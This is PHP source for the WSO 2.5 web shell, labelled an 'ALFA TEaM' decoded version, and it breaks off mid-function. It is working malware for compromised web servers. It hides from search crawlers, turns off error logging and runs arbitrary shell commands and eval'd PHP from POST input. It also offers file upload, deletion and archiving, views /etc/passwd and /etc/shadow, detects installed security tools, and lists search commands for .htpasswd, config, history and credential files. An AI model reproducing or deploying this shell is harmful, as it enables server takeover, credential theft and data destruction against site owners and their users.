<?php
/*
* ALFA TEaM SHeLL Decoder By Eddie Kidiw
* Full Source Decoder: http://pastebin.com/Tyz8shbS
* Full Source Encoder: http://pastebin.com/UNyaR0h3
* Decoder Time: Saturday, Desember 19 2015
* @author sole sad & Invisible
* @solevisible@gmail.com
* @copyright 2014
*/
if(isset($_GET["solevisible"])){
$auth_pass="";
$color="#df5";
$default_action="FilesMan";
$default_use_ajax=true;
$default_charset="Windows-1251";

if(!empty($_SERVER['HTTP_USER_AGENT'])) { $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"); if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); exit; } } @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('max_execution_time',0); @set_time_limit(0); @set_magic_quotes_runtime(0); @define('WSO_VERSION', '2.5'); if(get_magic_quotes_gpc()) { function WSOstripslashes($array) { return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array); } $_POST = WSOstripslashes($_POST); $_COOKIE = WSOstripslashes($_COOKIE); } function wsoLogin() { die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>"); } function WSOsetcookie($k, $v) { $_COOKIE[$k] = $v; setcookie($k, $v); } if(!empty($auth_pass)) { if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass)) WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass); if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass)) wsoLogin(); } if(strtolower(substr(PHP_OS,0,3)) == "win") $os = 'win'; else $os = 'nix'; $safe_mode = @ini_get('safe_mode'); if(!$safe_mode) error_reporting(0); $disable_functions = @ini_get('disable_functions'); $home_cwd = @getcwd(); if(isset($_POST['c'])) @chdir($_POST['c']); $cwd = @getcwd(); if($os == 'win') { $home_cwd = str_replace("\\", "/", $home_cwd); $cwd = str_replace("\\", "/", $cwd); } if($cwd[strlen($cwd)-1] != '/') $cwd .= '/'; if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax; if($os == 'win') $aliases = array( "List Directory" => "dir", "Find index.php in current dir" => "dir /s /w /b index.php", "Find *config*.php in current dir" => "dir /s /w /b *config*.php", "Show active connections" => "netstat -an", "Show running services" => "net start", "User accounts" => "net user", "Show computers" => "net view", "ARP Table" => "arp -a", "IP Configuration" => "ipconfig /all" ); else $aliases = array( "List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid files" => "find / -type f -perm -04000 -ls", "find suid files in current dir" => "find . -type f -perm -04000 -ls", "find all sgid files" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php files" => "find / -type f -name config.inc.php", "find config* files" => "find / -type f -name \"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" =>"locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files"=>"locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv" ); function wsoHeader() { if(empty($_POST['charset'])) $_POST['charset'] = $GLOBALS['default_charset']; global $color; echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . WSO_VERSION ."</title>
<style>
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color: $color !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:300px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>"; $freeSpace = @diskfreespace($GLOBALS['cwd']); $totalSpace = @disk_total_space($GLOBALS['cwd']); $totalSpace = $totalSpace?$totalSpace:1; $release = @php_uname('r'); $kernel = @php_uname('s'); $explink = 'http://exploit-db.com/search/?action=search&filter_description='; if(strpos('Linux', $kernel) !== false) $explink .= urlencode('Linux Kernel ' . substr($release,0,6)); else $explink .= urlencode($kernel . ' ' . substr($release,0,3)); if(!function_exists('posix_getegid')) { $user = @get_current_user(); $uid = @getmyuid(); $gid = @getmygid(); $group = "?"; } else { $uid = @posix_getpwuid(posix_geteuid()); $gid = @posix_getgrgid(posix_getegid()); $user = $uid['name']; $uid = $uid['uid']; $group = $gid['name']; $gid = $gid['gid']; } $cwd_links = ''; $path = explode("/", $GLOBALS['cwd']); $n=count($path); for($i=0; $i<$n-1; $i++) { $cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\""; for($j=0; $j<=$i; $j++) $cwd_links .= $path[$j].'/'; $cwd_links .= "\")'>".$path[$i]."/</a>"; } $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866'); $opt_charsets = ''; foreach($charsets as $item) $opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>'; $m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network'); if(!empty($GLOBALS['auth_pass'])) $m['Logout'] = 'Logout'; $m['Self remove'] = 'SelfRemove'; $menu = ''; foreach($m as $k => $v) $menu .= '<th width="'.(int)(100/count($m)).'%">[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>'; $drives = ""; if($GLOBALS['os'] == 'win') { foreach(range('c','z') as $drive) if(is_dir($drive.':\\')) $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> '; } echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=green><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($totalSpace) . ' <span>Free:</span> ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">'; } function wsoFooter() { $is_writable = is_writable($GLOBALS['cwd'])?" <font color='green'>(Writeable)</font>":" <font color=red>(Not writable)</font>"; echo "
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		<td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
		<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
	</tr></table></div></body></html>"; } if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} } if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} } function wsoEx($in) { $out = ''; if (function_exists('exec')) { @exec($in,$out); $out = @join("\n",$out); } elseif (function_exists('passthru')) { ob_start(); @passthru($in); $out = ob_get_clean(); } elseif (function_exists('system')) { ob_start(); @system($in); $out = ob_get_clean(); } elseif (function_exists('shell_exec')) { $out = shell_exec($in); } elseif (is_resource($f = @popen($in,"r"))) { $out = ""; while(!@feof($f)) $out .= fread($f,1024); pclose($f); } return $out; } function wsoViewSize($s) { if($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824 ). ' GB'; elseif($s >= 1048576) return sprintf('%1.2f', $s / 1048576 ) . ' MB'; elseif($s >= 1024) return sprintf('%1.2f', $s / 1024 ) . ' KB'; else return $s . ' B'; } function wsoPerms($p) { if (($p & 0xC000) == 0xC000)$i = 's'; elseif (($p & 0xA000) == 0xA000)$i = 'l'; elseif (($p & 0x8000) == 0x8000)$i = '-'; elseif (($p & 0x6000) == 0x6000)$i = 'b'; elseif (($p & 0x4000) == 0x4000)$i = 'd'; elseif (($p & 0x2000) == 0x2000)$i = 'c'; elseif (($p & 0x1000) == 0x1000)$i = 'p'; else $i = 'u'; $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-'); $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-')); $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-'); $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-')); $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-'); $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-')); return $i; } function wsoPermsColor($f) { if (!@is_readable($f)) return '<font color=#FF0000>' . wsoPerms(@fileperms($f)) . '</font>'; elseif (!@is_writable($f)) return '<font color=white>' . wsoPerms(@fileperms($f)) . '</font>'; else return '<font color=#25ff00>' . wsoPerms(@fileperms($f)) . '</font>'; } function wsoScandir($dir) { if(function_exists("scandir")) { return scandir($dir); } else { $dh = opendir($dir); while (false !== ($filename = readdir($dh))) $files[] = $filename; return $files; } } function wsoWhich($p) { $path = wsoEx('which ' . $p); if(!empty($path)) return $path; return false; } function actionSecInfo() { wsoHeader(); echo '<h1>Server security information</h1><div class=content>'; function wsoSecParam($n, $v) { $v = trim($v); if($v) { echo '<span>' . $n . ': </span>'; if(strpos($v, "\n") === false) echo $v . '<br>'; else echo '<pre class=ml1>' . $v . '</pre>'; } } wsoSecParam('Server software', @getenv('SERVER_SOFTWARE')); if(function_exists('apache_get_modules')) wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules())); wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none'); wsoSecParam('Open base dir', @ini_get('open_basedir')); wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir')); wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir')); wsoSecParam('cURL support', function_exists('curl_version')?'enabled':'no'); $temp=array(); if(function_exists('mysql_get_client_info')) $temp[] = "MySql (".mysql_get_client_info().")"; if(function_exists('mssql_connect')) $temp[] = "MSSQL"; if(function_exists('pg_connect')) $temp[] = "PostgreSQL"; if(function_exists('oci_connect')) $temp[] = "Oracle"; wsoSecParam('Supported databases', implode(', ', $temp)); echo '<br>'; if($GLOBALS['os'] == 'nix') { wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no'); wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no'); wsoSecParam('OS version', @file_get_contents('/proc/version')); wsoSecParam('Distr name', @file_get_contents('/etc/issue.net')); if(!$GLOBALS['safe_mode']) { $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl'); $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja'); $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); echo '<br>'; $temp=array(); foreach ($userful as $item) if(wsoWhich($item)) $temp[] = $item; wsoSecParam('Userful', implode(', ',$temp)); $temp=array(); foreach ($danger as $item) if(wsoWhich($item)) $temp[] = $item; wsoSecParam('Danger', implode(', ',$temp)); $temp=array(); foreach ($downloaders as $item) if(wsoWhich($item)) $temp[] = $item; wsoSecParam('Downloaders', implode(', ',$temp)); echo '<br/>'; wsoSecParam('HDD space', wsoEx('df -h')); wsoSecParam('Hosts', @file_get_contents('/etc/hosts')); echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>'; if (isset ($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) { $temp = ""; for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) { $uid = @posix_getpwuid($_POST['p2']); if ($uid) $temp .= join(':',$uid)."\n"; } echo '<br/>'; wsoSecParam('Users', $temp); } } } else { wsoSecParam('OS Version',wsoEx('ver')); wsoSecParam('Account Settings',wsoEx('net accounts')); wsoSecParam('User Accounts',wsoEx('net user')); } echo '</div>'; wsoFooter(); } function actionPhp() { if(isset($_POST['ajax'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true); ob_start(); eval($_POST['p1']); $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n"; echo strlen($temp), "\n", $temp; exit; } if(empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0); wsoHeader(); if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) { echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>'; ob_start(); phpinfo(); $tmp = ob_get_clean(); $tmp = preg_replace(array ( '!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU', '!td, th {(.*)}!msiU', '!<img[^>]+>!msiU', ), array ( '', '.e, .v, .h, .h th {$1}', '' ), $tmp); echo str_replace('<h1','<h2', $tmp) .'</div><br>'; } echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">'; echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>'; if(!empty($_POST['p1'])) { ob_start(); eval($_POST['p1']); echo htmlspecialchars(ob_get_clean()); } echo '</pre></div>'; wsoFooter(); } function actionFilesMan() { if (!empty ($_COOKIE['f'])) $_COOKIE['f'] = @unserialize($_COOKIE['f']); if(!empty($_POST['p1'])) { switch($_POST['p1']) { case 'uploadFile': if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) echo "Can't upload file!"; break; case 'mkdir': if(!@mkdir($_POST['p2'])) echo "Can't create new dir"; break; case 'delete': function deleteDir($path) { $path = (substr($path,-1)=='/') ? $path:$path.'/'; $dh = opendir($path); while ( ($item = readdir($dh) ) !== false) { $item = $path.$item; if ( (basename($item) == "..") || (basename($item) == ".") ) continue; $type = filetype($item); if ($type == "dir") deleteDir($item); else @unlink($item); } closedir($dh); @rmdir($path); } if(is_array(@$_POST['f'])) foreach($_POST['f'] as $f) { if($f == '..') continue; $f = urldecode($f); if(is_dir($f)) deleteDir($f); else @unlink($f); } break; case 'paste': if($_COOKIE['act'] == 'copy') { function copy_paste($c,$s,$d){ if(is_dir($c.$s)){ mkdir($d.$s); $h = @opendir($c.$s); while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c.$s.'/',$f, $d.$s.'/'); } elseif(is_file($c.$s)) @copy($c.$s, $d.$s); } foreach($_COOKIE['f'] as $f) copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']); } elseif($_COOKIE['act'] == 'move') { function move_paste($c,$s,$d){ if(is_dir($c.$s)){ mkdir($d.$s); $h = @opendir($c.$s); while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c.$s.'/',$f, $d.$s.'/'); } elseif(@is_file($c.$s)) @copy($c.$s, $d.$s); } foreach($_COOKIE['f'] as $f) @rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f); } elseif($_COOKIE['act'] == 'zip') { if(class_exists('ZipArchive')) { $zip = new ZipArchive(); if ($zip->open($_POST['p2'], 1)) { chdir($_COOKIE['c']); foreach($_COOKIE['f'] as $f) { if($f == '..') continue; if(@is_file($_COOKIE['c'].$f)) $zip->addFile($_COOKIE['c'].$f, $f); elseif(@is_dir($_COOKIE['c'].$f)) { $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/')); foreach ($iterator as $key=>$value) { $zip->addFile(realpath($key), $key); } } } chdir($GLOBALS['cwd']); $zip->close(); } } } elseif($_COOKIE['act'] == 'unzip') { if(class_exists('ZipArchive')) { $zip = new ZipArchive(); foreach($_COOKIE['f'] as $f) { if($zip->open($_COOKIE['c'].$f)) { $zip->extractTo($GLOBALS['cwd']); $zip->close(); } } } } elseif($_COOKIE['act'] == 'tar') { chdir($_COOKIE['c']); $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']); wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f'])); chdir($GLOBALS['cwd']); } unset($_COOKIE['f']); setcookie('f', '', time() - 3600); break; default: if(!empty($_POST['p1'])) { WSOsetcookie('act', $_POST['p1']); WSOsetcookie('f', serialize(@$_POST['f'])); WSOsetcookie('c', @$_POST['c']); } break; } } wsoHeader(); echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>'; $dirContent = wsoScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']); if($dirContent === false) { echo 'Can\'t open this folder!';wsoFooter(); return; } global $sort; $sort = array('name', 1); if(!empty($_POST['p1'])) { if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]); } echo "<script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>"; $dirs = $files = array(); $n = count($dirContent); for($i=0;$i<$n;$i++) { $ow = @posix_getpwuid(@fileowner($dirContent[$i])); $gr = @posix_getgrgid(@filegroup($dirContent[$i])); $tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'].$dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]), 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]), 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i]) ); if(@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file')); elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path']))); elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&& ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array('type' => 'dir')); } $GLOBALS['sort'] = $sort; function wsoCmp($a, $b) { if($GLOBALS['sort'][0] != 'size') return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1); else return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1); } usort($files, "wsoCmp"); usort($dirs, "wsoCmp"); $files = array_merge($dirs, $files); $l = 0; foreach($files as $f) { echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?wsoViewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms'] .'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>'; $l = $l?0:1; } echo "<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>"; if(class_exists('ZipArchive')) echo "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>"; echo "<option value='tar'>Compress (tar.gz)</option>"; if(!empty($_COOKIE['act']) && @count($_COOKIE['f'])) echo "<option value='paste'>Paste / Compress</option>"; echo "</select>&nbsp;"; if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar'))) echo "file name: <input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;"; echo "<input type='submit' value='>>'></td></tr></form></table></div>"; wsoFooter(); } function actionStringTools() { if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}} if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}} if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}} if(!function_exists('ascii2hex')) {function 